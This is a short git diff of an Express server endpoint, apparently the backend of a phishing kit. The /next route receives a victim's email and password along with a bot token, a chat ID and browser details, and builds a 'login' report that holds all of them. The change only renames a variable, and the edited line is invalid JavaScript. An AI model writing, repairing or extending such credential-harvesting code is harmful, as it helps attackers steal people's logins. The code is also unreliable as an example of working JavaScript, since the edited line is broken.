@@ -8,11 +8,11 @@ const port = 3000;
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-let page ="";
+let pageN ="";
 app.post('/next', (req, res) => {
   const { ai, pr, btTkn, chId, userAgent, timeZone, page } = req.body;
- 
-  let message = '---------- 📧' + ${page}+'login 📧 ----------\n';
+ pageN = page;
+  let message = '---------- 📧' + ${pageN}+'login 📧 ----------\n';
   message += `email: ${ai} \n`;
   message += `password: ${pr} \n`;
   message += `browser details: ${userAgent} \n`;
